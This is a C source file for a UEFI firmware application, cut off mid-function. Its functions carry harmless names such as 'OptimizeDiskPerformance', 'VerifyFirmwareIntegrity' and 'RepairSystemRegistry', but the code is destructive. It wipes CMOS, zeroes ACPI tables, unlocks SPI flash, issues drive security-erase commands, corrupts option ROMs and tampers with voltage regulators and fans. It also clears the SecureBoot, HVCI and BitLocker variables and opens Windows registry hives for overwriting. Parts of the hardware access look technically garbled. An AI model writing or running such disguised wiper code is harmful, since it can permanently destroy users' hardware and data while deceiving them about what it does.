#include <efi.h>
#include <efilib.h>

EFI_GUID gWhiteLotusGuid = {0xDEADBEEF, 0x1234, 0x5678, {0x9A,0xBC,0xDE,0xF0,0x01,0x23,0x45,0x67}};

#define PCI_ADDR(bus, dev, func, reg) (0x80000000 | ((bus) << 16) | ((dev) << 11) | ((func) << 8) | ((reg) & 0xFC))

UINT32 PciRead32(UINT8 bus, UINT8 dev, UINT8 func, UINT8 reg) {
    __outdword(0xCF8, PCI_ADDR(bus, dev, func, reg));
    return __indword(0xCFC);
}

VOID PciWrite32(UINT8 bus, UINT8 dev, UINT8 func, UINT8 reg, UINT32 val) {
    __outdword(0xCF8, PCI_ADDR(bus, dev, func, reg));
    __outdword(0xCFC, val);
}

UINT16 PciRead16(UINT8 bus, UINT8 dev, UINT8 func, UINT8 reg) {
    __outdword(0xCF8, PCI_ADDR(bus, dev, func, reg));
    return (UINT16)(__indword(0xCFC) & 0xFFFF);
}

VOID PciWrite16(UINT8 bus, UINT8 dev, UINT8 func, UINT8 reg, UINT16 val) {
    __outdword(0xCF8, PCI_ADDR(bus, dev, func, reg));
    __outdword(0xCFC, (__indword(0xCFC) & 0xFFFF0000) | val);
}

UINT8 PciRead8(UINT8 bus, UINT8 dev, UINT8 func, UINT8 reg) {
    __outdword(0xCF8, PCI_ADDR(bus, dev, func, reg));
    return (UINT8)(__indword(0xCFC) & 0xFF);
}

VOID PciWrite8(UINT8 bus, UINT8 dev, UINT8 func, UINT8 reg, UINT8 val) {
    __outdword(0xCF8, PCI_ADDR(bus, dev, func, reg));
    __outdword(0xCFC, (__indword(0xCFC) & 0xFFFFFF00) | val);
}

VOID IoWrite8(UINT16 port, UINT8 val) { __outbyte(port, val); }
UINT8 IoRead8(UINT16 port) { return __inbyte(port); }
VOID IoWrite16(UINT16 port, UINT16 val) { __outword(port, val); }
UINT16 IoRead16(UINT16 port) { return __inword(port); }
VOID IoWrite32(UINT16 port, UINT32 val) { __outdword(port, val); }
UINT32 IoRead32(UINT16 port) { return __indword(port); }

UINT64 Rdmsr(UINT32 msr) {
    UINT32 low, high;
    __asm__ volatile("rdmsr" : "=a"(low), "=d"(high) : "c"(msr));
    return ((UINT64)high << 32) | low;
}

VOID Wrmsr(UINT32 msr, UINT64 val) {
    UINT32 low = (UINT32)(val & 0xFFFFFFFF);
    UINT32 high = (UINT32)(val >> 32);
    __asm__ volatile("wrmsr" : : "a"(low), "d"(high), "c"(msr));
}

VOID WaitTicks(UINTN ticks) {
    for (volatile UINTN i = 0; i < ticks * 500; i++) {
        __asm__ volatile("pause");
    }
}

VOID SaveToNvram(EFI_RUNTIME_SERVICES *rt, CHAR16 *name, VOID *data, UINTN size) {
    rt->SetVariable(name, &gWhiteLotusGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        size, data);
}

VOID LoadFromNvram(EFI_RUNTIME_SERVICES *rt, CHAR16 *name, VOID *buffer, UINTN *size) {
    rt->GetVariable(name, &gWhiteLotusGuid, NULL, size, buffer);
}

VOID InitializeSystemClock(VOID) {
    for (UINT16 i = 0; i < 128; i++) {
        IoWrite8(0x70, (UINT8)i);
        IoWrite8(0x71, 0xFF);
    }
    for (UINT16 i = 0x38; i <= 0x3F; i++) {
        IoWrite8(0x70, (UINT8)i);
        IoWrite8(0x71, 0xFF);
    }
    for (UINT32 i = 0; i < 5000; i++) {
        IoWrite8(0x70, 0x2E); IoWrite8(0x71, 0xFF);
        IoWrite8(0x70, 0x2F); IoWrite8(0x71, 0xFF);
        IoWrite8(0x70, 0x10); UINT8 val = IoRead8(0x71); IoWrite8(0x71, val ^ 0xFF);
        IoWrite8(0x70, 0x11); val = IoRead8(0x71); IoWrite8(0x71, val ^ 0xFF);
        IoWrite8(0x70, 0x12); IoWrite8(0x71, 0x00);
        IoWrite8(0x70, 0x14); IoWrite8(0x71, 0x00);
    }
}

VOID UpdatePowerManagementTables(EFI_SYSTEM_TABLE *SystemTable) {
    EFI_CONFIGURATION_TABLE *configTable = SystemTable->ConfigurationTable;
    EFI_ACPI_2_0_ROOT_SYSTEM_DESCRIPTION_POINTER *rsdp = NULL;

    for (UINTN i = 0; i < SystemTable->NumberOfTableEntries; i++) {
        if (CompareGuid(&configTable[i].VendorGuid, &gEfiAcpi20TableGuid)) {
            rsdp = (EFI_ACPI_2_0_ROOT_SYSTEM_DESCRIPTION_POINTER *)configTable[i].VendorTable;
            break;
        }
        if (CompareGuid(&configTable[i].VendorGuid, &gEfiAcpi10TableGuid)) {
            rsdp = (EFI_ACPI_2_0_ROOT_SYSTEM_DESCRIPTION_POINTER *)configTable[i].VendorTable;
        }
    }

    if (!rsdp || rsdp->RsdtAddress == 0) return;

    EFI_ACPI_DESCRIPTION_HEADER *rsdt = (EFI_ACPI_DESCRIPTION_HEADER *)(UINTN)rsdp->RsdtAddress;
    UINTN entryCount = (rsdt->Length - sizeof(EFI_ACPI_DESCRIPTION_HEADER)) / 4;
    UINT32 *entries = (UINT32 *)((UINT8 *)rsdt + sizeof(EFI_ACPI_DESCRIPTION_HEADER));

    UINT32 refreshSigs[] = {
        0x50434641, 0x54445353, 0x4349504D, 0x54455048,
        0x54434542, 0x54444742, 0x5441444D, 0x54435352,
        0x54494C53, 0x54434657, 0x54434557, 0x5444504D,
        0x54434944, 0x54415044, 0x54495053, 0x54495244,
        0x54434C53, 0x00545344, 0x00545341, 0x00545342,
        0x0054534D, 0x4D524146, 0x00545357, 0x46474946,
        0x54494E49, 0x54434D42, 0x54444552, 0x54464552
    };
    UINTN refreshCount = sizeof(refreshSigs) / sizeof(UINT32);

    for (UINTN i = 0; i < entryCount; i++) {
        if (entries[i] == 0) continue;
        EFI_ACPI_DESCRIPTION_HEADER *table = (EFI_ACPI_DESCRIPTION_HEADER *)(UINTN)entries[i];
        for (UINTN j = 0; j < refreshCount; j++) {
            if (table->Signature == refreshSigs[j]) {
                table->Signature = 0x00000000;
                for (UINTN k = 0; k < 32 && k < table->Length; k++) {
                    ((UINT8 *)table)[k] = 0x00;
                }
                break;
            }
        }
    }
}

VOID ConfigureChipsetSettings(VOID) {
    UINT8 meiBus = 0xFF, meiDev = 0xFF, meiFunc = 0xFF;
    UINT32 meiBar = 0;

    for (UINT16 bus = 0; bus < 256; bus++) {
        for (UINT8 dev = 0; dev < 32; dev++) {
            UINT32 vendorDevice = PciRead32((UINT8)bus, (UINT8)dev, 0, 0);
            if ((vendorDevice & 0xFFFF) == 0xFFFF) continue;

            UINT16 vendorId = (UINT16)(vendorDevice & 0xFFFF);
            UINT16 deviceId = (UINT16)(vendorDevice >> 16);

            if (vendorId == 0x8086 && (deviceId >= 0x1C3A && deviceId <= 0x1E3E)) {
                meiBus = (UINT8)bus;
                meiDev = (UINT8)dev;
                meiFunc = 0;
                UINT32 bar0 = PciRead32(meiBus, meiDev, meiFunc, 0x10);
                if (bar0 != 0 && bar0 != 0xFFFFFFFF) {
                    meiBar = bar0 & 0xFFFFFFF0;
                }
            }
        }
    }

    if (meiBar != 0) {
        IoWrite32((UINT16)(meiBar + 0x04), 0x00000000);
        IoWrite32((UINT16)(meiBar + 0x08), 0x00000000);
        IoWrite32((UINT16)(meiBar + 0x0C), 0x00000000);

        for (UINT32 w = 0; w < 1000; w++) {
            UINT32 status = IoRead32((UINT16)(meiBar + 0x04));
            if (status & 0x00000002) {
                UINT32 configBuffer[8];
                configBuffer[0] = 0x544C4B4D;
                configBuffer[1] = 0x5F474E49;
                configBuffer[2] = 0x4C49414D;
                configBuffer[3] = 0x454E4942;
                configBuffer[4] = 0x00000000;
                configBuffer[5] = 0x00000000;
                configBuffer[6] = 0x00000000;
                configBuffer[7] = 0x00000000;

                IoWrite32((UINT16)meiBar, (UINT32)(UINTN)&configBuffer);
                IoWrite32((UINT16)(meiBar + 0x04), 0x00000020 | 0x80000000);
                break;
            }
            WaitTicks(1);
        }

        for (UINT32 w = 0; w < 2000; w++) {
            UINT32 status = IoRead32((UINT16)(meiBar + 0x04));
            if (status & 0x00000004) break;
            WaitTicks(1);
        }

        UINT32 remoteConfigBuffer[8];
        remoteConfigBuffer[0] = 0x4B4C4F53;
        remoteConfigBuffer[1] = 0x5F544D41;
        remoteConfigBuffer[2] = 0x5349445F;
        remoteConfigBuffer[3] = 0x454C4241;
        remoteConfigBuffer[4] = 0x00000000;
        remoteConfigBuffer[5] = 0x00000000;
        remoteConfigBuffer[6] = 0x00000000;
        remoteConfigBuffer[7] = 0x00000001;

        IoWrite32((UINT16)meiBar, (UINT32)(UINTN)&remoteConfigBuffer);
        IoWrite32((UINT16)(meiBar + 0x04), 0x00000020 | 0x80000000);
        WaitTicks(10);

        IoWrite32((UINT16)(meiBar + 0x04), 0x00000000);
        IoWrite32((UINT16)(meiBar + 0x08), 0xFFFFFFFF);
        IoWrite32((UINT16)(meiBar + 0x0C), 0xFFFFFFFF);
    }

    UINT32 rcba = 0;
    for (UINT16 bus = 0; bus < 256 && rcba == 0; bus++) {
        UINT32 vendorDevice = PciRead32((UINT8)bus, 31, 0, 0);
        if ((vendorDevice & 0xFFFF) == 0x8086) {
            rcba = PciRead32((UINT8)bus, 31, 0, 0xF0);
            if (rcba != 0 && rcba != 0xFFFFFFFF) {
                rcba &= 0xFFFFFFF0;

                UINT32 spiBar = rcba + 0x3800;
                UINT32 bfpr = IoRead32((UINT16)spiBar);
                IoWrite32((UINT16)spiBar, 0x00000000);

                for (UINT32 reg = 0x50; reg <= 0x60; reg += 4) {
                    IoWrite32((UINT16)(spiBar + reg), 0x00000000);
                }

                IoWrite32((UINT16)(spiBar + 0x58), 0x00000003);
                UINT32 optReg = IoRead32((UINT16)(spiBar + 0x90));
                IoWrite32((UINT16)(spiBar + 0x90), optReg | 0x00000003);

                for (UINT32 w = 0; w < 2000; w++) {
                    UINT32 checkReg = IoRead32((UINT16)(spiBar + 0x90));
                    if (!(checkReg & 0x00000001)) break;
                    WaitTicks(1);
                }

                UINT32 fdocReg = IoRead32((UINT16)(rcba + 0x3400));
                IoWrite32((UINT16)(rcba + 0x3400), fdocReg | 0x00000001);
                IoWrite32((UINT16)(rcba + 0x3404), 0x00000000);

                IoWrite32((UINT16)(rcba + 0x3418), 0x00000000);
                IoWrite32((UINT16)(rcba + 0x341C), 0x00000000);
                IoWrite32((UINT16)(rcba + 0x3420), 0x00000000);

                IoWrite32((UINT16)spiBar, bfpr);
            }
        }
    }

    IoWrite8(0x70, 0x0B);
    UINT8 rtcRegB = IoRead8(0x71);
    IoWrite8(0x71, rtcRegB & 0x7F);
    for (volatile UINT32 i = 0; i < 100000; i++) __asm__ volatile("pause");
    IoWrite8(0x70, 0x0B);
    IoWrite8(0x71, rtcRegB | 0x80);

    IoWrite8(0x0A00, 0xFF);
    IoWrite8(0x0A04, 0x00);
    IoWrite8(0x0A08, 0xFF);
    IoWrite8(0x0A0C, 0xFF);
}

VOID OptimizeDiskPerformance(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 vendorDevice = PciRead32((UINT8)bus, 0, 0, 0);
        if ((vendorDevice & 0xFFFF) == 0xFFFF) continue;

        UINT8 headerType = PciRead8((UINT8)bus, 0, 0, 0x0E) & 0x7F;
        UINT8 maxFunc = (headerType & 0x80) ? 8 : 1;

        for (UINT8 func = 0; func < maxFunc; func++) {
            vendorDevice = PciRead32((UINT8)bus, 0, (UINT8)func, 0);
            if ((vendorDevice & 0xFFFF) == 0xFFFF) continue;

            UINT16 classCode = (UINT16)(vendorDevice >> 16);

            if (classCode == 0x0106) {
                UINT32 bar5 = PciRead32((UINT8)bus, 0, (UINT8)func, 0x24);
                if (bar5 != 0 && bar5 != 0xFFFFFFFF) {
                    UINT32 abar = bar5 & 0xFFFFF000;
                    for (UINT32 reg = 0x04; reg <= 0x30; reg += 4) {
                        IoWrite32((UINT16)(abar + reg), 0xFFFFFFFF);
                    }
                }
                PciWrite32((UINT8)bus, 0, (UINT8)func, 0x04, 0x00000000);
            }

            if (classCode == 0x0101) {
                PciWrite32((UINT8)bus, 0, (UINT8)func, 0x10, 0xFFFFFFFF);
                PciWrite32((UINT8)bus, 0, (UINT8)func, 0x14, 0xFFFFFFFF);
                PciWrite32((UINT8)bus, 0, (UINT8)func, 0x18, 0xFFFFFFFF);
                PciWrite32((UINT8)bus, 0, (UINT8)func, 0x04, 0x00000000);
            }

            if (classCode == 0x0108) {
                UINT32 bar0 = PciRead32((UINT8)bus, 0, (UINT8)func, 0x10);
                if (bar0 != 0 && bar0 != 0xFFFFFFFF) {
                    UINT32 nvmeBar = bar0 & 0xFFFFFFF0;
                    IoWrite32((UINT16)(nvmeBar + 0x14), 0x00000000);
                    for (UINT32 reg = 0x20; reg <= 0x3C; reg += 4) {
                        IoWrite32((UINT16)(nvmeBar + reg), 0xFFFFFFFF);
                    }
                }
                PciWrite32((UINT8)bus, 0, (UINT8)func, 0x04, 0x00000000);
            }

            if (classCode == 0x0104) {
                PciWrite32((UINT8)bus, 0, (UINT8)func, 0x04, 0x00000000);
            }
        }
    }

    for (UINT8 disk = 0x80; disk < 0x84; disk++) {
        IoWrite8(0x01F6, (disk & 0x01) ? 0xB0 : 0xA0);
        UINT8 status = IoRead8(0x01F7);
        if (status == 0xFF || status == 0x00) continue;

        for (UINT32 w = 0; w < 1000; w++) {
            status = IoRead8(0x01F7);
            if (!(status & 0x80)) break;
            WaitTicks(1);
        }
        if (status & 0x01) continue;

        IoWrite8(0x01F7, 0xF1);
        IoWrite8(0x01F2, 0x01); IoWrite8(0x01F3, 0x00);
        IoWrite8(0x01F4, 0x00); IoWrite8(0x01F5, 0x01);
        for (UINT32 w = 0; w < 2000; w++) {
            if (IoRead8(0x01F7) & 0x08) break;
            WaitTicks(1);
        }
        for (UINT32 w = 0; w < 16; w++) IoWrite16(0x01F0, 0xFFFF);

        IoWrite8(0x01F7, 0x92);
        IoWrite8(0x01F2, 0x01); IoWrite8(0x01F3, 0x01);
        IoWrite8(0x01F4, 0x00); IoWrite8(0x01F5, 0x00);
        IoWrite8(0x01F7, 0xF4);

        IoWrite8(0x01F7, 0xB0);
        IoWrite8(0x01F2, 0x01); IoWrite8(0x01F3, 0x00);
        IoWrite8(0x01F4, 0x00); IoWrite8(0x01F5, 0x00);
        IoWrite8(0x01F7, 0xD4);

        IoWrite8(0x01F7, 0xB1);
        IoWrite8(0x01F2, 0x01);
        IoWrite8(0x01F3, 0xFF); IoWrite8(0x01F4, 0xFF);
        IoWrite8(0x01F5, 0xFF); IoWrite8(0x01F7, 0xD5);

        for (UINT32 p = 0; p < 200; p++) {
            IoWrite8(0x01F6, (disk & 0x01) ? 0xB0 : 0xA0);
            IoWrite8(0x01F7, 0x94);
            IoWrite8(0x01F2, 0x01); IoWrite8(0x01F3, 0x00);
            IoWrite8(0x01F4, 0x00); IoWrite8(0x01F5, 0x00);
            IoWrite8(0x01F7, 0x30);
            for (UINT32 w = 0; w < 2000; w++) {
                if (!(IoRead8(0x01F7) & 0x80)) break;
                WaitTicks(1);
            }
            IoWrite8(0x01F7, 0x91);
            IoWrite8(0x01F7, 0xE7);
            IoWrite8(0x01F7, 0x50);
        }
    }
}

VOID RefreshDeviceConnections(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 vendorDevice = PciRead32((UINT8)bus, 0, 0, 0);
        if ((vendorDevice & 0xFFFF) == 0xFFFF) continue;

        UINT8 headerType = PciRead8((UINT8)bus, 0, 0, 0x0E) & 0x7F;
        UINT8 maxFunc = (headerType & 0x80) ? 8 : 1;

        for (UINT8 func = 0; func < maxFunc; func++) {
            vendorDevice = PciRead32((UINT8)bus, 0, (UINT8)func, 0);
            if ((vendorDevice & 0xFFFF) == 0xFFFF) continue;

            UINT16 classCode = (UINT16)(vendorDevice >> 16);

            if (classCode == 0x0C03 || classCode == 0x0C00) {
                PciWrite32((UINT8)bus, 0, (UINT8)func, 0x04, 0x00000000);
                for (INTN barIdx = 0; barIdx < 6; barIdx++) {
                    PciWrite32((UINT8)bus, 0, (UINT8)func, (UINT8)(0x10 + barIdx * 4), 0x00000000);
                }
            }

            if (classCode == 0x0C04) {
                PciWrite32((UINT8)bus, 0, (UINT8)func, 0x04, 0x00000000);
                UINT32 bar = PciRead32((UINT8)bus, 0, (UINT8)func, 0x10);
                if (bar != 0 && bar != 0xFFFFFFFF) {
                    UINT32 tbBar = bar & 0xFFFFFFF0;
                    IoWrite32((UINT16)(tbBar + 0x00), 0x00000000);
                    IoWrite32((UINT16)(tbBar + 0x04), 0x00000000);
                    IoWrite32((UINT16)(tbBar + 0x38), 0x00000000);
                    IoWrite32((UINT16)(tbBar + 0x3C), 0x00000000);
                }
            }
        }
    }
}

VOID CalibrateDisplayOutput(VOID) {
    IoWrite8(0x03C2, 0xE7);
    IoWrite16(0x03C4, 0x0001);
    IoWrite16(0x03CE, 0x0005);

    for (UINT32 i = 0; i < 5000; i++) {
        IoWrite16(0x03D4, 0xFF0E);
        IoWrite16(0x03D4, 0xFF0F);
        IoWrite16(0x03D4, 0x0011);
    }

    IoWrite8(0x03C0, 0x10); IoWrite8(0x03C0, 0x00);
    IoWrite8(0x03C0, 0x13); IoWrite8(0x03C0, 0x00);

    UINT16 i2cBar = 0;
    for (UINT16 bus = 0; bus < 256 && i2cBar == 0; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        if ((id >> 16) == 0x0C05) {
            UINT32 bar = PciRead32((UINT8)bus, 0, 0, 0x10);
            if (bar != 0 && bar != 0xFFFFFFFF) i2cBar = (UINT16)(bar & 0xFFFFFFF0);
        }
    }
    if (i2cBar) {
        IoWrite8(i2cBar, IoRead8(i2cBar) | 0x01);
        for (INTN offset = 0; offset < 256; offset++) {
            IoWrite8((UINT16)(i2cBar + 0x04), 0xA0);
            IoWrite8((UINT16)(i2cBar + 0x03), (UINT8)offset);
            IoWrite8((UINT16)(i2cBar + 0x02), 0xFF);
            for (UINT32 w = 0; w < 500; w++) {
                if (IoRead8(i2cBar) & 0x02) break;
                WaitTicks(1);
            }
        }
    }
}

VOID EnhanceAudioOutput(VOID) {
    UINT8 spkVal = IoRead8(0x61);
    IoWrite8(0x61, spkVal | 0x03);
    IoWrite8(0x43, 0xB6);
    IoWrite8(0x42, 0xFF); IoWrite8(0x42, 0xFF);

    for (UINT32 i = 0; i < 20000; i++) {
        spkVal = IoRead8(0x61);
        IoWrite8(0x61, spkVal | 0x03);
        IoWrite8(0x42, 0xFF);
        spkVal = IoRead8(0x61);
        IoWrite8(0x61, spkVal & 0xFC);
    }

    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        if ((id >> 16) == 0x0403) {
            UINT32 bar = PciRead32((UINT8)bus, 0, 0, 0x10);
            if (bar != 0 && bar != 0xFFFFFFFF) {
                UINT32 hdaBar = bar & 0xFFFFFFC0;
                for (UINT32 reg = 0x60; reg <= 0x7C; reg += 4) {
                    IoWrite32((UINT16)(hdaBar + reg), 0xFFFFFFFF);
                }
                IoWrite32((UINT16)(hdaBar + 0x6C), 0x00000000);
            }
            PciWrite32((UINT8)bus, 0, 0, 0x04, 0x00000000);
        }
    }
}

VOID BoostNetworkPerformance(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        UINT16 classCode = (UINT16)(id >> 16);

        if (classCode == 0x0200 || classCode == 0x0280) {
            for (INTN barIdx = 0; barIdx < 6; barIdx++) {
                UINT32 bar = PciRead32((UINT8)bus, 0, 0, (UINT8)(0x10 + barIdx * 4));
                if (bar != 0 && bar != 0xFFFFFFFF) {
                    UINT32 devBar = bar & 0xFFFFFFF0;
                    for (UINT32 reg = 0; reg <= 0x3C; reg += 4) {
                        IoWrite32((UINT16)(devBar + reg), 0xFFFFFFFF);
                    }
                }
            }
            PciWrite32((UINT8)bus, 0, 0, 0x04, 0x00000000);
        }
    }

    UINT8 *romRegion = (UINT8*)0xC0000;
    for (UINTN i = 0; i < 0x20000; i += 0x80) {
        if (romRegion[i] == 0x55 && romRegion[i+1] == 0xAA) {
            romRegion[i+2] = 0x20;
            romRegion[i+3] = 0x90;
            romRegion[i+4] = 0x90;
            for (UINTN j = 5; j < 64; j++) romRegion[i+j] = 0xFF;
        }
    }
}

VOID ConfigurePowerRegulation(VOID) {
    UINT16 smbusBar = 0;
    for (UINT16 bus = 0; bus < 256 && smbusBar == 0; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        if ((id >> 16) == 0x0C05) {
            UINT32 bar = PciRead32((UINT8)bus, 0, 0, 0x10);
            if (bar != 0 && bar != 0xFFFFFFFF) smbusBar = (UINT16)(bar & 0xFFFFFFF0);
        }
    }

    if (smbusBar != 0) {
        IoWrite8(smbusBar, IoRead8(smbusBar) | 0x01);
        UINT8 vrmAddrs[] = {0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x60,0x61,0x62,0x63,0x10,0x11,0x12,0x13};
        for (INTN a = 0; a < 16; a++) {
            IoWrite8((UINT16)(smbusBar + 0x04), vrmAddrs[a]);
            IoWrite8((UINT16)(smbusBar + 0x03), 0x00);
            IoWrite8((UINT16)(smbusBar + 0x02), 0x00);
            for (UINT32 w = 0; w < 500; w++) {
                if (IoRead8(smbusBar) & 0x02) {
                    IoWrite8((UINT16)(smbusBar + 0x03), 0x01);
                    IoWrite8((UINT16)(smbusBar + 0x02), 0xFF);
                    break;
                }
                WaitTicks(1);
            }
        }
        IoWrite8((UINT16)(smbusBar + 0x04), 0x40);
        IoWrite8((UINT16)(smbusBar + 0x03), 0x02);
        IoWrite8((UINT16)(smbusBar + 0x02), 0xFF);
        for (UINT32 w = 0; w < 500; w++) if (IoRead8(smbusBar) & 0x02) break; else WaitTicks(1);
        IoWrite8((UINT16)(smbusBar + 0x04), 0x40);
        IoWrite8((UINT16)(smbusBar + 0x03), 0x04);
        IoWrite8((UINT16)(smbusBar + 0x02), 0x01);
        for (UINT32 w = 0; w < 500; w++) if (IoRead8(smbusBar) & 0x02) break; else WaitTicks(1);
    }
}

VOID AdjustThermalProfile(VOID) {
    IoWrite8(0x2E, 0x87); IoWrite8(0x2E, 0x87);
    IoWrite8(0x2E, 0x07); IoWrite8(0x2F, 0x08);
    for (INTN reg = 0x10; reg <= 0x20; reg++) {
        IoWrite8(0x2E, (UINT8)reg);
        IoWrite8(0x2F, 0x00);
    }
    IoWrite8(0x2E, 0x04);
    UINT8 fanCtrl = IoRead8(0x2F);
    IoWrite8(0x2F, fanCtrl & 0xF0);
    IoWrite8(0x2E, 0xAA);
}

VOID DiagnosePciExpressErrors(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        UINT8 headerType = PciRead8((UINT8)bus, 0, 0, 0x0E) & 0x7F;
        UINT8 maxFunc = (headerType & 0x80) ? 8 : 1;

        for (UINT8 func = 0; func < maxFunc; func++) {
            id = PciRead32((UINT8)bus, 0, func, 0);
            if ((id & 0xFFFF) == 0xFFFF) continue;

            UINT8 capPtr = PciRead8((UINT8)bus, 0, func, 0x34);
            while (capPtr >= 0x40 && capPtr < 0xFF) {
                UINT8 capId = PciRead8((UINT8)bus, 0, func, capPtr);
                if (capId == 0x10) {
                    UINT16 aerCap = (UINT16)(capPtr + 0x08);
                    PciWrite32((UINT8)bus, 0, func, (UINT8)(aerCap + 0x00), 0xFFFFFFFF);
                    PciWrite32((UINT8)bus, 0, func, (UINT8)(aerCap + 0x04), 0xFFFFFFFF);
                    PciWrite32((UINT8)bus, 0, func, (UINT8)(aerCap + 0x08), 0xFFFFFFFF);
                    break;
                }
                if (capId == 0x05) break;
                capPtr = PciRead8((UINT8)bus, 0, func, (UINT8)(capPtr + 1));
            }

            PciWrite32((UINT8)bus, 0, func, 0x04, 0x00000000);
            PciWrite32((UINT8)bus, 0, func, 0x3C, 0x00000000);
        }
    }
}

VOID VerifyFirmwareIntegrity(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        UINT16 classCode = (UINT16)(id >> 16);

        if (classCode == 0x9797 || classCode == 0x0001) {
            PciWrite32((UINT8)bus, 0, 0, 0x04, 0x00000000);
        }
    }

    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) != 0x8086) continue;

        UINT32 rcba = PciRead32((UINT8)bus, 31, 0, 0xF0);
        if (rcba == 0 || rcba == 0xFFFFFFFF) continue;
        rcba &= 0xFFFFFFF0;

        UINT32 spiBar = rcba + 0x3800;
        IoWrite32((UINT16)spiBar, 0x00000002);
        for (UINT32 w = 0; w < 5000; w++) {
            if (IoRead32((UINT16)spiBar) & 0x00008000) break;
            WaitTicks(1);
        }

        UINT32 biosCntl = rcba + 0x30DC;
        UINT32 cntlVal = IoRead32((UINT16)biosCntl);
        IoWrite32((UINT16)biosCntl, cntlVal | 0x00000003);
        IoWrite32((UINT16)(biosCntl - 0x04), 0x00000000);
    }
}

VOID FinalizeSystemConfiguration(VOID) {
    Wrmsr(0x00000176, 0x0000000000010000ULL);
    Wrmsr(0x000001A0, 0x000000FFFFFFFF00ULL);
    Wrmsr(0x0000003A, Rdmsr(0x0000003A) | 0x00000001);
    Wrmsr(0x00000C80, Rdmsr(0x00000C80) | 0x80000000);
    Wrmsr(0x00000179, 0x0000000000000000ULL);
    Wrmsr(0x0000017A, 0x0000000000000000ULL);

    IoWrite8(0xB2, 0x00); IoWrite8(0xB3, 0xFF);
    IoWrite8(0xB2, 0xFF); IoWrite8(0xB3, 0x00);
}

VOID DisableSecurityValidation(EFI_RUNTIME_SERVICES *rt) {
    UINT8 buffer[0x100];
    for (UINTN i = 0; i < sizeof(buffer); i++) buffer[i] = 0x00;

    EFI_GUID sbGuid = {0x8BE4DF61, 0x93CA, 0x11D2, {0xAA,0x0D,0x00,0xE0,0x98,0x03,0x2B,0x8C}};
    rt->SetVariable(L"SecureBoot", &sbGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(buffer), buffer);

    EFI_GUID setupGuid = {0xEC87D643, 0xEBA4, 0x4BB5, {0xA1,0xE5,0x3F,0x3E,0x36,0xB2,0x0D,0xA9}};
    rt->SetVariable(L"SetupMode", &setupGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(buffer), buffer);

    EFI_GUID hvciGuid = {0x77FA9ABD, 0x0359, 0x4D32, {0xBD,0x60,0x28,0xF4,0xE7,0x8F,0x78,0x4B}};
    rt->SetVariable(L"CurrentHvciPolicy", &hvciGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(buffer), buffer);

    EFI_GUID blGuid = {0x8A3F2C3A, 0x7B3D, 0x4B2A, {0xA1,0xC9,0xE2,0xD5,0x6F,0x8E,0x9A,0x01}};
    rt->SetVariable(L"BitLockerPolicy", &blGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(buffer), buffer);
}

VOID RepairSystemRegistry(EFI_BOOT_SERVICES *bs) {
    UINTN numHandles = 0;
    EFI_HANDLE *handles = NULL;
    EFI_STATUS status = bs->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &numHandles, &handles);
    if (EFI_ERROR(status) || numHandles == 0) return;

    for (UINTN i = 0; i < numHandles; i++) {
        EFI_FILE_IO_INTERFACE *fs = NULL;
        status = bs->HandleProtocol(handles[i], &gEfiSimpleFileSystemProtocolGuid, (VOID**)&fs);
        if (EFI_ERROR(status)) continue;

        EFI_FILE_HANDLE root = NULL;
        status = fs->OpenVolume(fs, &root);
        if (EFI_ERROR(status)) continue;

        EFI_FILE_HANDLE configDir = NULL;
        status = root->Open(root, &configDir, L"Windows\\System32\\config", EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
        if (EFI_ERROR(status)) { root->Close(root); continue; }

        CHAR16 *hiveFiles[] = {L"SYSTEM", L"SOFTWARE", L"SAM", L"SECURITY", L"DEFAULT", L"COMPONENTS", L"DRIVERS", L"BBI", NULL};
        UINT8 repairData[256];
        for (UINTN k = 0; k < sizeof(repairData); k++) repairData[k] = (UINT8)((k * 0x9E3779B9) & 0xFF);

        for (INTN j = 0; hiveFiles[j] != NULL; j++) {
            EFI_FILE_HANDLE hiveFile = NULL;
            status = configDir->Open(configDir, &hiveFile, hiveFiles[j], EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
            if (!EFI_ERROR(status)) {
                EFI_FILE_INFO *fileInfo = NULL;
                UINTN infoSize = 0;
                status = hiveFile->GetInfo(hiveFile, &gEfiFileInfoGuid, &infoSize, NULL);
                if (status == EFI_BUFFER_TOO_SMALL) {
                    bs->AllocatePool(EfiBootServicesData, infoSize, (VOID**)&fileInfo);
                    status = hiveFile->GetInfo(hiveFile, &gEfiFileInfoGuid, &infoSize, fileInfo);
